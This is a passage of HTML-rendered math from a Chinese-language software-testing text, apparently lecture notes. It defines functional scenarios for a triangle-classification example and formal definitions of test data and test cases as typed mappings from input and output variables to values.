encoding="application/x-tex">FS_3:G_3\; and\;D_3 \;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal">an</span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span></span></span></span></eq></li></ul></li><li>（4）<ul><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>G</mi><mn>4</mn></msub><mo>:</mo><mi>d</mi><mn>1</mn><mo>≤</mo><mn>0</mn><mtext>  </mtext><mi>o</mi><mi>r</mi><mtext>  </mtext><mi>d</mi><mn>2</mn><mo>≤</mo><mn>0</mn><mtext>  </mtext><mi>o</mi><mi>r</mi><mtext>  </mtext><mi>d</mi><mn>3</mn><mo>≤</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">G_4:d1\leq 0 \; or \; d2\leq 0 \; or \; d3\leq 0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8304em;vertical-align:-0.136em;"></span><span class="mord mathnormal">d</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8304em;vertical-align:-0.136em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">or</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal">d</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8304em;vertical-align:-0.136em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">or</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal">d</span><span class="mord">3</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span></eq></li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>D</mi><mn>4</mn></msub><mo>:</mo><msub><mi>t</mi><mrow><mi>t</mi><mi>y</mi><mi>p</mi><mi>e</mi></mrow></msub><mo>=</mo><mi mathvariant="normal">&quot;</mi><mi>n</mi><mi>o</mi><mi>w</mi><mo>−</mo><mi>t</mi><mi>r</mi><mi>i</mi><mi>a</mi><mi>n</mi><mi>g</mi><mi>l</mi><mi>e</mi><mi mathvariant="normal">&quot;</mi></mrow><annotation encoding="application/x-tex">D_4:t_{type} = &quot;now-triangle&quot;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9012em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight">e</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.0833em;"></span><span class="mord">&quot;</span><span class="mord mathnormal">n</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">ian</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord">&quot;</span></span></span></span></eq></li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><msub><mi>S</mi><mn>4</mn></msub><mo>:</mo><msub><mi>G</mi><mn>4</mn></msub><mtext>  </mtext><mi>a</mi><mi>n</mi><mi>d</mi><mtext>  </mtext><msub><mi>D</mi><mn>4</mn></msub><mtext>  </mtext></mrow><annotation encoding="application/x-tex">FS_4:G_4\; and\;D_4 \;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal">an</span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span></span></span></span></eq></li></ul></li></ul></li></ul><h4 id="2.2-%E6%B5%8B%E8%AF%95%E7%94%A8%E4%BE%8B%E7%94%9F%E6%88%90%E6%A0%87%E5%87%86" tabindex="-1">2.2 测试用例生成标准</h4><h5 id="define-3-test-data" tabindex="-1">Define 3 test data</h5><ul><li>测试数据是对所有输入变量从其类型中分配值的一种赋值。</li></ul><h5 id="define-4-test-case" tabindex="-1">Define 4 test case</h5><ul><li>测试用例是测试数据和期望输出值的组合</li><li>令 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>S</mi><mrow><mi>i</mi><mi>v</mi></mrow></msub><mo>=</mo><mo stretchy="false">{</mo><msub><mi>x</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>x</mi><mn>2</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>x</mi><mi>n</mi></msub><mo stretchy="false">}</mo><mo separator="true">,</mo><msub><mi>S</mi><mrow><mi>o</mi><mi>v</mi></mrow></msub><mo>=</mo><mo stretchy="false">{</mo><msub><mi>y</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>y</mi><mn>2</mn></msub><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>y</mi><mi>m</mi></msub><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">S_{iv} = \{x_1,x_2,...x_n\},S_{ov}=\{y_1,y_2..y_m\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">...</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">}</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">..</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">}</span></span></span></span></eq> 为操作 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span></eq> 的所有输入集和输出集. 令 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi><mi>y</mi><mi>p</mi><mi>e</mi><mo stretchy="false">(</mo><mi>z</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">Type(z)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord mathnormal">p</span><span class="mord mathnormal">e</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mclose">)</span></span></span></span></eq> 表示输入变量或输出变量的类型，<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>z</mi><mo>∈</mo><mo stretchy="false">{</mo><msub><mi>x</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>x</mi><mn>2</mn></msub><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>x</mi><mi>n</mi></msub><mo separator="true">,</mo><msub><mi>y</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>y</mi><mn>2</mn></msub><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>y</mi><mi>m</mi></msub><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">z\in\{x_1,x_2..x_n,y_1,y_2..y_m\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">..</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">..</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">}</span></span></span></span></eq>.</li><li>一个测试用例，用 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi><mi>c</mi></mrow><annotation encoding="application/x-tex">tc</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6151em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal">c</span></span></span></span></eq> 表示，是一个从集合 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>S</mi><mrow><mi>i</mi><mi>v</mi></mrow></msub></mrow><annotation encoding="application/x-tex">S_{iv}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq> 到集合 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>S</mi><mrow><mi>o</mi><mi>v</mi></mrow></msub></mrow><annotation encoding="application/x-tex">S_{ov}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq> 的映射，即 <section><eqn><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>t</mi><mi>c</mi><mo>:</mo><msub><mi>S</mi><mrow><mi>i</mi><mi>v</mi></mrow></msub><mo>∪</mo><msub><mi>S</mi><mrow><mi>i</mi><mi>v</mi></mrow></msub><mo>→</mo><mi>V</mi><mi>a</mi><mi>l</mi><mi>u</mi><mi>e</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">tc: S_{iv} \cup S_{iv} \rightarrow Values</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6151em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∪</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">Va</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">u</span><span class="mord mathnormal">es</span></span></span></span></span></eqn></section> <section><eqn><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>t</mi><mi>c</mi><mo stretchy="false">(</mo><mi>z</mi><mo stretchy="false">)</mo><mo>∈</mo><mi>T</mi><mi>y</mi><mi>p</mi><mi>e</mi><mo stretchy="false">(</mo><mi>z</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">tc(z) \in Type(z)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal">c</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord mathnormal">p</span><span class="mord mathnormal">e</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mclose">)</span></span></span></span></span></eqn></section>,其中 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>V</mi><mi>a</mi><mi>l</mi><mi>u</mi><mi>e</mi><mi>s</mi><mo>=</mo><mi>T</mi><mi>y</mi><mi>p</mi><mi>e</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mo>∪</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi>T</mi><mi>y</mi><mi>p</mi><mi>e</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mi>n</mi></msub><mo stretchy="false">)</mo><mo>∪</mo><mi>T</mi><mi>y</mi><mi>p</mi><mi>e</mi><mo stretchy="false">(</mo><msub><mi>y</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mo>∪</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi>T</mi><mi>y</mi><mi>p</mi><mi>e</mi><mo stretchy="false">(</mo><msub><mi>y</mi><mi>m</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">Values=Type(x_1)\cup ...Type(x_n)\cup Type(y_1) \cup .. Type(y_m)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">Va</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">u</span><span class="mord mathnormal">es</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span 